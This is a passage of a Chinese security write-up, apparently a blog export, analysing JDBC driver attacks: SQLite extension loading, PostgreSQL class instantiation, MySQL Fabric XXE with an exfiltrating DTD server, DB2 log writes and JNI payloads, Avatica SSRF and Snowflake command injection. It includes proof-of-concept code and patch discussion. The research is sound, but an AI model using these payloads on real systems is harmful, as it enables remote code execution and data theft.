文件，并将文件重命名为 poc.so.db\ngcc -s -fPIC -shared poc.c -o poc.so\n通过以下代码进行测试\npublic static void main( String[] args ) throws SQLException, ClassNotFoundException {\n\tClass.forName(&quot;org.sqlite.JDBC&quot;);\n\tString url = &quot;jdbc:sqlite:file:load.db\n \n\tConnection connection = DriverManager.getConnection(url);\n \n\tconnection.setAutoCommit(true);\n\tStatement statement = connection.createStatement();\n\tstatement.execute(\n\t\t\t&quot;SELECT load_extension(&#039;/home/trganda/Projects/sqlite/extension/poc.so.db&#039;, &#039;poc&#039;)&quot;);\n \n\tstatement.close();\n\tconnection.close();\n}\n成功执行 touch /tmp/poc_trganda 命令并创建了 /tmp/poc_trganda 文件。\n\n\n这里说一点题外话，在 SQLite Load An Extension 文档提到了 sqlite3_load_extension 函数的加载逻辑。如果指定的文件无法被正确加载『例如，文件不存在』，那么会自动添加操作系统相关的后缀『samplelib.so、samplelib.dylib、samplelib.dll』，并重新尝试加载。\n\n但是编译后的链接库文件太大了，有 16K！！！，远超 8K。这个问题让我想起曾经看过的一本书，《程序员的自我修养》，里面提到过如何构建一个足够小的 Hello World 程序。\nStrip Extension\n为了解决这个问题，需要构建一个尽可能小的链接库，并且不影响它的功能。通过编辑器查看 poc.so 文件，里面有大段大段的 00。\n\n查看 section header，会发现 Off 远大于 Size，这意味着链接时为了对其浪费了很多空间，而且其中还包含了很多用不上的 section。\n➜  extension readelf -S -W poc.so\nThere are 28 section headers, starting at offset 0x3158:\n \nSection Headers:\n  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al\n  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0\n  [ 1] .note.gnu.property NOTE            00000000000002a8 0002a8 000020 00   A  0   0  8\n  [ 2] .note.gnu.build-id NOTE            00000000000002c8 0002c8 000024 00   A  0   0  4\n  [ 3] .gnu.hash         GNU_HASH        00000000000002f0 0002f0 000028 00   A  4   0  8\n  [ 4] .dynsym           DYNSYM          0000000000000318 000318 0000c0 18   A  5   1  8\n  [ 5] .dynstr           STRTAB          00000000000003d8 0003d8 000082 00   A  0   0  1\n  [ 6] .gnu.version      VERSYM          000000000000045a 00045a 000010 02   A  4   0  2\n  [ 7] .gnu.version_r    VERNEED         0000000000000470 000470 000020 00   A  5   1  8\n查看默认的链接脚本，发现使用了 MAXPAGESIZE，在 x86_64 环境下，这个值一般为 4K\n\n链接脚本（Linker Script），用于控制 gcc 链接器行为。\n\nld --verbose\nGNU ld (GNU Binutils for Ubuntu) 2.38\n...\n  . = ALIGN(CONSTANT (MAXPAGESIZE));\n为此，有两种方法，一种是自行编写 Linker Script 用于控制链接行为，缩减大小。还有一种方式是在链接时使用 -Wl,-z,max-page-size=&lt;hex format&gt; 参数，这里选择后者（会导致错误：ELF load command address/offset not page-aligned），采用如下方式重新编译，\ngcc -Os -flto -fdata-sections -ffunction-sections -c poc.c\n再用修改过的链接脚本进行链接\ngcc -T poc.lds -fPIC -s -nostartfiles -nostdlib -flto -shared poc.o -o pocs.so\n得到的文件大小为 2.2 K『这不是大小的极限，但足够用了』。\nls -l\n-rwxr-xr-x 1 trganda root 2.2K Jun  8 09:06 poc.so\n利用\n有了前面的基础就可以尝试利用了，以下为 Poc 代码。\n\n测试环境是 Ubuntu\n\npublic static void createDb(String path) {\n\tFile dbFile = new File(&quot;src/main/resources/poc.db&quot;);\n\tif (dbFile.exists()) {\n\t\tdbFile.delete();\n\t}\n \n\ttry (Connection conn =\n\t\t\t DriverManager.getConnection(\n\t\t\t\t String.format(&quot;jdbc:sqlite:%s&quot;, &quot;src/main/resources/poc.db&quot;));) {\n\t\tconn.setAutoCommit(true);\n\t\tStatement statement = conn.createStatement();\n\t\tstatement.execute(String.format(&quot;CREATE VIEW POC AS SELECT load_extension(&#039;%s&#039;, &#039;poc&#039;);&quot;, path));\n\t\tstatement.close();\n\t} catch (SQLException e) {\n\t\t// ttk...\n\t}\n}\n \n@Test\npublic void sqlite() throws SQLException, MalformedURLException {\n \n\tString extensionUrl = &quot;http://127.0.0.1:8001/poc.so&quot;;\n \n\tURL resourceAddr = new URL(extensionUrl);\n\tString extensionPath = String.format(&quot;/tmp/sqlite-jdbc-tmp-%d.db&quot;, resourceAddr.hashCode());\n\tSystem.out.println(extensionPath);\n \n\tcreateDb(extensionPath);\n \n\tSystem.out.println(System.getProperty(&quot;java.io.tmpdir&quot;));\n \n\t// upload extension file\n\tConnection conn =\n\t\t\tDriverManager.getConnection(\n\t\t\t\t\tString.format(&quot;jdbc:sqlite::resource:%s&quot;, extensionUrl));\n\tconn.close();\n \n\t// poc\n\tString url =\n\t\t\t&quot;jdbc:sqlite::resource:http://127.0.0.1:8001/poc.db\n\tConnection connection = DriverManager.getConnection(url);\n\tconnection.setAutoCommit(true);\n \n\tStatement statement = connection.createStatement();\n\tstatement.execute(&quot;SELECT * FROM POC&quot;);\n \n\tstatement.close();\n\tconnection.close();\n}\n运行结果如下\n\nSQLite Magellan\n\n有关 SQLite Magellan 漏洞，参考腾讯 Blade 团队的议题，i.blackhat.com/USA-19/Thursday/us-19-Qian-Exploring-The-New-World-Remote-Exploitation-Of-SQLite-And-Curl-wp.pdf。\n\nCVE-2023-32697\n前面分析完 SQLite Driver 的利用方法后，可以认定它是一个漏洞了，但是当查找 SQLite Driver 的历史漏洞时（如果没有重复的，就可以尝试给维护者发邮件了）发现 2023 年 5 月份已经有一个 JDBC 漏洞 CVE-2023-32697。\n补丁如下：\n\nComparing 3.41.2.1…3.41.2.2 · xerial/sqlite-jdbc · GitHub\n\n补丁中增加了临时文件名的随机性，很明显前面的利用方式已经有人发现并提交官方修复了。\n\nPostgreSQL\n\nCVE-2022-21724\n\nPostgreSQL Driver 的部分属性设置中，支持设定自定义类（和参数）\n\nsslfactory\n\nsslfactoryarg\n\n\nsocketFactory\n\nsocketFactoryArg\n\n\nsslhostnameverifier\nsslpasswordcallback\nauthenticationPluginClassName\n\n可利用的主要有两个 sslfactory 和 socketFactory，其它三个无法传递参数，造成漏洞的核心代码位于 org.postgresql.util.ObjectFactory，\npublic static Object instantiate(String classname, Properties info, boolean tryString, String stringarg) throws ... {\n\tObject[] args = new Object[]{info};\n\tConstructor&lt;?&gt; ctor = null;\n\tClass&lt;?&gt; cls = Class.forName(classname);\n \n\ttry {\n\t\tctor = cls.getConstructor(Properties.class);\n\t} catch (NoSuchMethodException var9) {\n\t}\n \n\tif (tryString &amp;&amp; ctor == null) {\n\t\ttry {\n\t\t\tctor = cls.getConstructor(String.class);\n\t\t\targs = new String[]{stringarg};\n\t\t} catch (NoSuchMethodException var8) {\n\t\t}\n\t}\n \n\tif (ctor == null) {\n\t\tctor = cls.getConstructor();\n\t\targs = new Object[0];\n\t}\n \n\treturn ctor.newInstance(args);\n}\n这两个属性的处理逻辑位于 org.postgresql.core.SocketFactoryFactory，\npublic static SocketFactory getSocketFactory(Properties info) throws PSQLException {\n    // Socket factory\n    String socketFactoryClassName = PGProperty.SOCKET_FACTORY.get(info);\n    if (socketFactoryClassName == null) {\n      return SocketFactory.getDefault();\n    }\n    try {\n      return (SocketFactory) ObjectFactory.instantiate(socketFactoryClassName, info, true,\n          PGProperty.SOCKET_FACTORY_ARG.get(info));\n\t// ...\n \n \npublic static SSLSocketFactory getSslSocketFactory(Properties info) throws PSQLException {\n\tString classname = PGProperty.SSL_FACTORY.get(info);\n\tif (classname == null\n\t\t|| &quot;org.postgresql.ssl.jdbc4.LibPQFactory&quot;.equals(classname)\n\t\t|| &quot;org.postgresql.ssl.LibPQFactory&quot;.equals(classname)) {\n\t  return new LibPQFactory(info);\n\t}\n\ttry {\n\t  return (SSLSocketFactory) ObjectFactory.instantiate(classname, info, true,\n\t\t  PGProperty.SSL_FACTORY_ARG.get(info));\n\t// ...\n\t```\n \n根据代码中的内容，和官方文档的介绍\n \n![](../../Resources/Projects/JDBC%20Connection%20URL%20Attack/Part-II%20Make%20JDBC%20Attacks%20Brilliant%20Again/IMG-20230610125033528.png)\n \n指定的类需要有接收 `String` 类型、或 `Properties` 类型的构造方法，或无参构造方法。`pyn3rd` 在他的文章 [Make JDBC Attacks Brilliant Again II](pyn3rd.github.io/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/) 中已经介绍了利用方法，其中除了涵盖 `sslfactory` 和 `socketFactory` 的利用外，还包括另外两个属性 `loggerLevel` 和 `loggerFile` 下的利用（文件写入）。\n \n文章中列举的工具类如下：\n \n- `org.springframework.context.support.ClassPathXmlApplicationContext`\n- `org.springframework.context.support.FileSystemXmlApplicationContext`\n- `java.io.FileOutputStream`\n \nPoc 文件，\n \n```xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n    &lt;beans xmlns=&quot;www.springframework.org/schema/beans&quot;\n       xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot;\n       xsi:schemaLocation=&quot;\n     www.springframework.org/schema/beans www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\n        &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;\n            &lt;constructor-arg &gt;\n            &lt;list&gt;\n                &lt;value&gt;open&lt;/value&gt;\n                &lt;value&gt;-a&lt;/value&gt;\n                &lt;value&gt;calculator&lt;/value&gt;\n            &lt;/list&gt;\n            &lt;/constructor-arg&gt;\n        &lt;/bean&gt;\n    &lt;/beans&gt;\nSslfactory &amp; Sslfactoryarg\n当建立 Socket 连接后，会发送请求数据。如果响应内容中的第一个字符为 S [19]，那么就调用 MakeSSL.convert [20]。\nprivate PGStream enableSSL(PGStream pgStream, SslMode sslMode, Properties info,\n\tif (sslMode == SslMode.DISABLE) {\n\t      return pgStream;\n\t    }\n\t    if (sslMode == SslMode.ALLOW) {\n\t      // Allow ==&gt; start with plaintext, use encryption if required by server\n\t      return pgStream;\n\t    }\n \n\t    LOGGER.log(Level.FINEST, &quot; FE=&gt; SSLRequest&quot;);\n \n\t    // Send SSL request packet\n\t    pgStream.sendInteger4(8);\n\t    pgStream.sendInteger2(1234);\n\t    pgStream.sendInteger2(5679);\n\t    pgStream.flush();\n \n\t    // Now get the response from the backend, one of N, E, S.\n\t    int beresp = pgStream.receiveChar();\n\t    switch (beresp) {\n\t      case &#039;E&#039;:\n\t        LOGGER.log(Level.FINEST, &quot; &lt;=BE SSLError&quot;);\n \n\t        // Server doesn&#039;t even know about the SSL handshake protocol\n\t        if (sslMode.requireEncryption()) {\n\t          throw new PSQLException(GT.tr(&quot;The server does not support SSL.&quot;),\n\t              PSQLState.CONNECTION_REJECTED);\n\t        }\n \n\t        // We have to reconnect to continue.\n\t        return new PGStream(pgStream, connectTimeout);\n \n\t      case &#039;N&#039;:\n\t        LOGGER.log(Level.FINEST, &quot; &lt;=BE SSLRefused&quot;);\n \n\t        // Server does not support ssl\n\t        if (sslMode.requireEncryption()) {\n\t          throw new PSQLException(GT.tr(&quot;The server does not support SSL.&quot;),\n\t              PSQLState.CONNECTION_REJECTED);\n\t        }\n \n\t        return pgStream;\n \n\t      case &#039;S&#039;: // [19]\n\t        LOGGER.log(Level.FINEST, &quot; &lt;=BE SSLOk&quot;);\n \n\t        // Server supports ssl\n\t        org.postgresql.ssl.MakeSSL.convert(pgStream, info); // [20]\n\t        return pgStream;\nPoc 代码如下，\n@Test\npublic void sslFactory() throws SQLException {\n\tString url = &quot;jdbc:postgresql://localhost/test?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;sslfactoryarg=ftp://127.0.0.1:2121/bean.xml&quot;;\n\tDriverManager.getConnection(url);\n}\npython3 -m pyftpdlib -d . 打开一个 ftp 服务，传输 xml 文件。通过 nc -l 5432 监听端口，连接后，输入 S 并返回。\nsocketFactory &amp; socketFactoryArg\n没有需要特别注意的地方，Poc 代码如下\n@Test\npublic void socketFactory() throws SQLException {\n\tString url = &quot;jdbc:postgresql://localhost/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=ftp://127.0.0.1:2121/bean.xml&quot;;\n\tDriverManager.getConnection(url);\n}\n修复与绕过\nPPT 中提到了两个开源软件的修复方案\nApache Druid CVE-2021-26919 Patch\n\n具体见 commit\n\npublic static void throwIfPropertiesAreNotAllowed(\n\tSet&lt;String&gt; actualProperties,\n\tSet&lt;String&gt; systemPropertyPrefixes,\n\tSet&lt;String&gt; allowedProperties\n\t)\n{\n\tfor (String property : actualProperties) {\n\t\tif\n\t\t(systemPropertyPrefixes.stream().noneMatch(property::startsWith)) {\n\t\t\tPreconditions.checkArgument(\n\t\t\tallowedProperties.contains(property),\n\t\t\t&quot;The property [%s] is not in the allowed list %s&quot;,\n\t\t\tproperty, allowedProperties\n\t\t);\n\t}\n}\nApache DolphinScheduler CVE-2020-11974 Patch\nprivate final Logger logger = LoggerFactory.getLogger(MySQLDataSource.class);\nprivate final String sensitiveParam = &quot;autoDeserialize=true&quot;;\nprivate final char symbol = &#039;&amp;&#039;;\n \n@Override\nprotected String filterOther(String other){\n\tif (other.contains(sensitiveParam)){\n\t\tint index = other.indexOf(sensitiveParam);\n\t\tString tmp = sensitiveParam;\n\t\tif (other.charAt(index-1) == symbol){\n\t\t\ttmp = symbol + tmp;\n\t} else if(other.charAt(index + 1) == symbol){\n\t\ttmp = tmp + symbol;\n\t}\n\tlogger.warn(&quot;sensitive param : {} in otherParams field is filtered&quot;, tmp);\n\tother = other.replace(tmp, &quot;&quot;);\n}\n从修复方式上看，都是采用的黑名单。为此作者提出，针对 Druid 可以使用 com.mysql.fabric.jdbc.FabricMySQLDriver 绕过，并通过 SSRF 漏洞配合 XML 外部实体注入进行利用。\n\n有关 fabric 和一般 mysql 的区别可以参考 What’s the difference between MySQL Fabric and MySQL Cluster - Database Administrators Stack Exchange。\n\n作者以 fabric 为例演示了具体的利用方法『只要 fabirc 能绕过黑名单，且只使用了 Druid 补丁中允许的属性，那么就可以利用』\n\n分析版本为 mysql-connector-java:5.1.49\n\n首先由 com.mysql.fabric.jdbc.FabricMySQLDriver#acceptsURL 可以知道 URL 连接串的格式要求需要以 jdbc:mysql:fabric:// 开头。\n@Override\npublic boolean acceptsURL(String url) throws SQLException {\n\treturn parseFabricURL(url, null) != null;\n}\n \nProperties parseFabricURL(String url, Properties defaults) throws SQLException {\n\tif (!url.startsWith(&quot;jdbc:mysql:fabric://&quot;)) {\n\t\treturn null;\n\t}\n\t// We have to fudge the URL here to get NonRegisteringDriver.parseURL() to parse it for us.\n\t// It actually checks the prefix and bails if it&#039;s not recognized.\n\t// jdbc:mysql:fabric:// =&gt; jdbc:mysql://\n\treturn super.parseURL(url.replaceAll(&quot;fabric:&quot;, &quot;&quot;), defaults);\n}\n查看 com.mysql.fabric.jdbc.FabricMySQLDriver#connect 方法，通过反射创建 com.mysql.fabric.jdbc.JDBC4FabricMySQLConnectionProxy，\n@Override\npublic Connection connect(String url, Properties info) throws SQLException {\n\tProperties parsedProps = parseFabricURL(url, info);\n \n\tif (parsedProps == null) {\n\t\treturn null;\n\t}\n \n\tparsedProps.setProperty(FABRIC_PROTOCOL_PROPERTY_KEY, &quot;http&quot;);\n\tif (com.mysql.jdbc.Util.isJdbc4()) {\n\t\ttry {\n\t\t\tConstructor&lt;?&gt; jdbc4proxy = Class.forName(&quot;com.mysql.fabric.jdbc.JDBC4FabricMySQLConnectionProxy&quot;)\n\t\t\t\t\t.getConstructor(new Class[] { Properties.class });\n\t\t\treturn (Connection) com.mysql.jdbc.Util.handleNewInstance(jdbc4proxy, new Object[] { parsedProps }, null); // [12]\n}\n在 JDBC4FabricMySQLConnectionProxy 构造方法中会调用至 FabricConnection 的构造方法，\n// JDBC4FabricMySQLConnectionProxy -&gt; FabricMySQLConnectionProxy -&gt; FabricConnection\npublic JDBC4FabricMySQLConnectionProxy(Properties props) throws SQLException {\n\tsuper(props);\n}\n \npublic FabricMySQLConnectionProxy(Properties props) throws SQLException {\nprops.getProperty(&quot;exceptionInterceptors&quot;);\n\t// ...\n \n\ttry {\n\t\tString url = this.fabricProtocol + &quot;://&quot; + this.host + &quot;:&quot; + this.port;\n\t\tthis.fabricConnection = new FabricConnection(url, this.fabricUsername, this.fabricPassword);\n\t// ...\n}\n \npublic FabricConnection(String url, String username, String password) throws FabricCommunicationException {\n\tthis.client = new XmlRpcClient(url, username, password);\n\trefreshState();\n}\n可以看到创建了一个 XmlRpcClient，并调用 refreshState 方法发起请求，\npublic int refreshState() throws FabricCommunicationException {\n\tFabricStateResponse&lt;Set&lt;ServerGroup&gt;&gt; serverGroups = this.client.getServerGroups(); // [13]\n[13] 逐步调用至 getServerGroups，\npublic FabricStateResponse&lt;Set&lt;ServerGroup&gt;&gt; getServerGroups(String groupPattern) throws FabricCommunicationException {\n\tint version = 0; // necessary but unused\n\tResponse response = errorSafeCallMethod(METHOD_DUMP_SERVERS, new Object[] { version, groupPattern });\n最终会通过 HTTP 协议在 Client#execute 方法中发起请求，并解析响应内容 [15]，不过在分析的版本中（5.1.49）关闭了实体的解析 [14]，但是 (0, 5.1.48] 中是没有设置的。\npublic MethodResponse execute(MethodCall methodCall) throws IOException, ParserConfigurationException, SAXException, MySQLFabricException {\n\tHttpURLConnection connection = null;\n\ttry {\n\t\tconnection = (HttpURLConnection) this.url.openConnection();\n\t\tconnection.setRequestMethod(&quot;POST&quot;);\n\t\tconnection.setRequestProperty(&quot;User-Agent&quot;, &quot;MySQL XML-RPC&quot;);\n\t\tconnection.setRequestProperty(&quot;Content-Type&quot;, &quot;text/xml&quot;);\n \n\t\t// ...\n \n\t\t// Get Response\n\t\tInputStream is = connection.getInputStream();\n\t\tSAXParserFactory factory = SAXParserFactory.newInstance();\n\t\tfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n\t\tfactory.setFeature(&quot;apache.org/xml/features/disallow-doctype-decl&quot;, true); // [14]\n\t\tSAXParser parser = factory.newSAXParser();\n\t\tResponseParser saxp = new ResponseParser();\n \n\t\tparser.parse(is, saxp); // [15]\nPoc 代码如下\n\n测试环境 mysql-connector-java:5.1.48\n\n@Test\npublic void fabric() throws SQLException {\n\tString url = &quot;jdbc:mysql:fabric://127.0.0.1:5000&quot;;\n\tConnection conn = DriverManager.getConnection(url);\n}\n恶意 XML 服务代码如下\nfrom flask import Flask\napp = Flask(__name__)\n \n@app.route(&#039;/xxe.dtd&#039;, methods=[&#039;GET&#039;, &#039;POST&#039;])\ndef xxe_oob():\n  return &#039;&#039;&#039;&lt;!ENTITY % aaaa SYSTEM &quot;fiLe:///tmp/data&quot;&gt;\n  &lt;!ENTITY % demo &quot;&lt;!ENTITY bbbb SYSTEM\n  &#039;http://127,0.0.1:5000/xxe?data=%aaaa;&#039;&gt;&quot;&gt; %demo;&#039;&#039;&#039;\n \n@app.route(&#039;/&#039;, methods=[&#039;GET&#039;, &#039;POST&#039;])\ndef dtd():\n  return &#039;&#039;&#039;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n  &lt;!DOCTYPE ANY [\n  &lt;!ENTITY % xd SYSTEM &quot;http://127.0.0.1:5000/xxe.dtd&quot;&gt; %xd;]&gt;\n  &lt;root&gt;&amp;bbbb;&lt;/root&gt;&#039;&#039;&#039;\n \nif __name__ == &#039;__main__&#039;:\n  app.run()\n参考\n\nHITBSecConf2021SIN Materials\nMake JDBC Attacks Brilliant Again I\nMake JDBC Attacks Brilliant Again II\nJDBC driver - IBM Documentation\nIBM Documentation - IBM Documentation\nWhat’s the difference between MySQL Fabric and MySQL Cluster - Database Administrators Stack Exchange\nSQL JDBC driver API · Apache Druid\n编写一个最小的 64 位 Hello World - CJ Ting’s Blog\n"},"articles/security/java/jdbc/Part-III-A-New-Attack-Interface-in-Java-Application":{"title":"Part-III A New Attack Interface in Java Application","links":["cheat-sheets/Following-List"],"tags":["jdbc"],"content":"BlackHat Asis 2023 上 pyn3rd 再次分享了该攻击技术的新成果。\n\n PPT：BLACKHAT_Asia2023/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf at main · Mr-xn/BLACKHAT_Asia2023 · GitHub\n\n议题分 5 个部分，介绍 JDBC 的攻击利用方法\n\nAbused Connection Resource，滥用连接资源\nArbitrary Log File Writing，任意日志文件写入\nLexical Syntax Compatibility，\nUnchecked Initialization Class，不安全的类初始化\nIncorrect Response Disposal，错误的响应转发\n\nIBM Informix\n\nInformix 是 IBM 旗下的数据库产品。\n\nInfomix 支持从 LDAP 中获取数据库服务端主机的信息，见 Dynamically reading the sqlhosts file。可通过如下参数指定连接类型为 LDAP\n\nSQLH_TYPE=LDAP\nLDAP_URL=ldap://host-name:port-number，LDAP 服务的主机名和端口号\nLDAP_IFXBASE=Informix-base-DN\nLDAP_USER=user\nLDAP_PASSWD=password\n\n\n测试环境 com.ibm.informix:jdbc:4.10.14\n\n@Test\npublic void jndi() throws SQLException {\n\tString url =\n\t\t\t&quot;jdbc:informix-sqli:informixserver=value;SQLH_TYPE=LDAP;LDAP_URL=ldap://127.0.0.1:1389;LDAP_IFXBASE=cn=evilClass;&quot;;\n \n\tDriverManager.getConnection(url);\n}\n触发位置位于 com.informix.jns.LdapSqlhosts#getServer，[1]。\npublic ServerInfo getServer(String sname) throws IfxJNSException {\n\tString nsNettype = &quot;default_nettype&quot;;\n\tString nsHostname = &quot;default_hostname&quot;;\n\tString nsService = &quot;default_service&quot;;\n\tString nsOptions = &quot;default_options&quot;;\n \n\ttry {\n\t\tSearchControls constraints = new SearchControls();\n\t\tconstraints.setSearchScope(LDAP_SCOPE0);\n\t\tString lbase = &quot;cn=&quot; + sname + &quot;,&quot; + this.ldap_sqhDn;\n\t\tNamingEnumeration&lt;SearchResult&gt; results = this.sqhctx.search(lbase, LDAP_FILTER, constraints); // [1]\n修复\n从测试结果看，当前最新版本的 com.ibm.informix:jdbc:4.50.10 已经不支持 LDAP 的方式获取 sqlhosts 信息了，具体见如下代码，会直接抛出异常。\npublic Sqlhosts(Properties sqhenv) throws IfxJNSException {\n\tString stype = sqhenv.getProperty(&quot;SQLH_TYPE&quot;, &quot;FILE&quot;);\n\tif (stype.equalsIgnoreCase(&quot;FILE&quot;)) {\n\t\tthis.fileSqlh = new FileSqlhosts(sqhenv);\n\t} else {\n\t\tthrow new IfxJNSException(&quot;Only FILE type is supported for SQLhost lookup.&quot;);\n\t}\n}\nIBM DB2 JCC\n相比以往议题中的内容，作者提到了可通过如下属性进行利用，\n\ntraceFile：根据文档，它可以指定日志文件的存储位置，可以配合以下属性进行配置\n\ntraceLevel：日志级别\ntraceFileAppend：是否以附加模式写入\n\n\npluginClassName：没能在官网的文档中找到这个属性的介绍，但是代码中确实存在 DB2BaseDataSource#getPluginClassName\n\n文件写入\nPPT 中描述的，使用如下代码，记录日志到指定路径\n@Test\npublic void db2log() throws SQLException {\n\tString url =\n\t\t&quot;jdbc:db2://216.127.190.23:50000/db:password=${Runtime.getRuntime().exec(\\&quot;test\\&quot;)};traceLevel=com.ibm.db2.jcc.DB2BaseDataSource.TRACE_ALL;traceFileAppend=false;traceFile=1.jsp;&quot;;\n\tDriverManager.getConnection(url);\n}\n但是 password 属性的内容会被记录成 ****，可以改为使用 user\n@Test\npublic void db2log() throws SQLException {\n\tString url =\n\t\t&quot;jdbc:db2://216.127.190.23:50000/db:user=${Runtime.getRuntime().exec(\\&quot;test\\&quot;)};traceLevel=com.ibm.db2.jcc.DB2BaseDataSource.TRACE_ALL;traceFileAppend=false;traceFile=1.jsp;&quot;;\n\tDriverManager.getConnection(url);\n}\n类初始化\n对于参数 pluginClassName，用户可通过它指定自定义类，并进行初始化和构造方法调用。那么目标环境中有如下一个类\npublic class EvilObject {\n\tpublic EvilObject () throws NamingException, IOException {\n\t\t\tjavax.naming.InitialContext.doLookup(&quot;ldap://127.0.0.1:1389/EvilObject&quot;);\n\t}\n}\n就可以通过下面的 URL 进行利用\n@Test\npublic void db2plugin() throws SQLException {\n\tString url =\n\t\t&quot;jdbc:db2://216.127.190.23:50000/db:pluginClassName=com.trganda.EvilObject;&quot;;\n\tDriverManager.getConnection(url);\n}\n对于真实场景，作者提到了另一个可利用的类 com.sun.security.auth.module.UnixSystem(Linux)/com.sun.security.auth.module.NTSystem(Windows)，构造方法如下\npublic UnixSystem() {\n\tSystem.loadLibrary(&quot;jaas_unix&quot;);\n\tgetUnixInfo();\n}\n它会加载 JRE 中的 lib 文件『Mac 中为 libjaas_unix.dylib』\ndocker run -h db2server --name db2server --restart=always --detach --privileged=true -p 50000:50000 --env-file .env_list -v database:/database icr.io/db2_community/db2\n那么如果 libjaas_unix.dylib 文件可控，则可以通过 JNI 编写如下恶意库进行利用.\n#include &lt;stdlib.h&gt;\n#include &lt;string&gt;\n#include &quot;jni.h&quot;\n \nusing namespace std;\n \njint JNI_OnLoad(JavaVM* vm, void* reserved) {\n\tJNIEnv* env;\n\tvm-&gt;AttachCurrentThread((void**)&amp;env, NULL);\n \n\tjclass system_clazz = env-&gt;FindClass(&quot;java/lang/System&quot;);\n\tjmethdID get_property_method = env-&gt;GetStaticMethodID(system_clazz, &quot;getProperty&quot;, &quot;(Ljava/lang/String;)Ljava/lang/String;&quot;);\n \n\tjboolean jsCopy;\n\tconst char* cmd = env-&gt;GetStringUTFChars(env-&gt;NewStringUTF(&quot;open -a calculator&quot;), &amp;jsCopy);\n\tstring ee;\n\tee += cmd;\n\tsystem(ee.c_str());\n \n\treturn JNI_VERSION_1_2;\n}\n但这个利用场景多少有点多余，作者举了更真实的案例，见 CVE-2022-36364\nMySQL\n作者提到对于 MySQL JDBC Driver 的 setBlob 方法可利用宽字节进行 SQL 注入（利用难度很大）。思路和宽直接注入的方法是一样，见下图\n\n以下为 Poc 代码。\n@Test\npublic void sqli() throws SQLException, IOException {\n\tString url =\n\t\t\t&quot;jdbc:mysql://127.0.0.1:3306/db?user=root&amp;password=trgadna&amp;useUnicode=true&amp;characterEncoding=gbk&amp;allowMultiQueries=true&quot;;\n\tConnection conn = DriverManager.getConnection(url);\n \n\tPreparedStatement ps = conn.prepareStatement(&quot;INSERT INTO t1 (size, data) VALUES (?, ?)&quot;);\n\tFile file = new File(&quot;exp.jsp&quot;);\n\tFileInputStream fis = new FileInputStream(file);\n\tps.setInt(1, (int) file.length());\n\tps.setBinaryStream(2, fis);\n\tps.execute();\n\tfis.close();\n}\nApache Calcite Avatica\nAvatica 是一款开源的数据库驱动构建框架，用于构建 JDBC 或 ODBC Driver。\nCVE-2022-36364\nAvatica 的 JDBC Client 中有一个参数，httpclient_impl，可以指定自定义类。并通过参数 url 的内容，调用相应的构造方法。\n相关代码位于 org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl#instantiateClient，[2]\nprivate AvaticaHttpClient instantiateClient(String className, URL url) {\n    try {\n      Class&lt;?&gt; clz = Class.forName(className);\n      Constructor&lt;?&gt; constructor = clz.getConstructor(URL.class);\n      Object instance = constructor.newInstance(Objects.requireNonNull(url)); // [2]\n      return AvaticaHttpClient.class.cast(instance);\n    } catch (Exception e) {\n      throw new RuntimeException(&quot;Failed to construct AvaticaHttpClient implementation &quot;\n          + className, e);\n    }\n  }\n以下为一个 SSRF 的 Poc 代码，借助 sun.security.provider.PolicyFile 发起请求读取远程文件。\n@Test\npublic void ssrf() throws SQLException {\n\tDriverManager.registerDriver(new Driver());\n\tString url = &quot;jdbc:avatica:remote:url=jdbc-attack.com\n \n\tDriverManager.getConnection(url);\n}\nPolicyFile\nsun.security.provider.PolicyFile 中的触发点位于 PolicyFile#init，[3]\nprivate boolean init(URL policy, PolicyInfo newInfo) {\n\tboolean success = false;\n\tPolicyParser pp = new PolicyParser(expandProperties);\n\tInputStreamReader isr = null;\n\ttry {\n \n\t\t// read in policy using UTF-8 by default\n\t\t//\n\t\t// check non-standard system property to see if\n\t\t// the default encoding should be used instead\n \n\t\tif (notUtf8) {\n\t\t\tisr = new InputStreamReader\n\t\t\t\t\t\t\t(PolicyUtil.getInputStream(policy));\n\t\t} else {\n\t\t\tisr = new InputStreamReader\n\t\t\t\t\t\t\t(PolicyUtil.getInputStream(policy), &quot;UTF-8&quot;); // [3]\n\t\t}\n \n\t\tpp.read(isr);\n此外 PPT 中还提到了另外三个类\n\ncom.sun.media.sound.SF2Soundbank\njavax.swing.JEditorPane\njdk.internal.loader.FileURLMapper\n\nSnowflake\n\n参考 CVE-2023-30535。\n\nSnakeflake JDBC Driver 支持单点登录功能，但在获取响应内容后直接拼接并执行命令，没有任何过滤。\n@Override\npublic void openBrowser(String ssoUrl) throws SFException {\n\ttry {\n\t\tif (Desktop.isDesktopSupported()) {\n\t\t\tURI uri = new URI(ssoUrl);\n\t\t\tDesktop.getDesktop().browse(uri);\n\t\t} else {\n\t\t\tRuntime runtime = Runtime.getRuntime();\n\t\t\tOS os = Constants.getOS();\n\t\t\tif (os == OS.MAC) {\n\t\t\t\truntime.exec(&quot;open &quot; + ssoUrl);\n\t\t\t} else {\n\t\t\t\truntime.exec(&quot;xdg-open &quot; + ssoUrl);\n\t\t\t}\n\t\t}\n\t} catch (IOException | URISyntaxException var4) {\n\t\tthrow new SFException(var4, ErrorCode.NETWORK_ERROR, new Object[]{var4.getMessage()});\n\t}\n}\nPoc 代码如下\n@Test\npublic void jndi() throws SQLException {\n\tString url =\n\t\t\t&quot;jdbc:snowflake://jdbc-attack.com/\n \n\tDriverManager.getConnection(url);\n}\n当开启验证方式为 externalbrowser，snowflake 会发起如下请求 [4]，见 SessionUtilExternalBrowser#getSSOUrl\njdbc-attack.com/session/authenticator-request\n\n并解析响应中的 json 数据 [5]，从中获取 ssoUrl 内容 [6]，拼接后造成命令注入。\nprivate String getSSOUrl(int port) throws SFException, SnowflakeSQLException {\n\ttry {\n\t\tString serverUrl = 